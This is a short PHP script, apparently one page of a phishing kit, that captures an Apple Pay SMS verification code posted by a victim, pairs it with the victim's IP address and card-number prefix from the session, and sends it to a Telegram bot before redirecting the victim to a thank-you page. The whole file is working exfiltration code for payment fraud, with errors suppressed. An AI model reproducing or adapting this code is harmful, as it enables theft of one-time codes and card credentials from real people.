<?php
error_reporting(0);
  ob_start();
  session_start();
include '../../email.php';
include '../../../infos.php';
include '../../../settings.php';
$bin=substr(str_replace(' ','',$_SESSION["c_num"]),0,6);	
$msgdureztuconnaissss = urlencode("ㅤ\n [📱] Apple Pay [📱] \n ㅤ\n ✔️ Apple Pay : ".$_POST['sms']."\n \n 🗑 Adresse IP : "._ip()."\n ㅤ");
$html = file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chatid.'&text='.$msgdureztuconnaissss.'');
header('location: ../merci.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
?>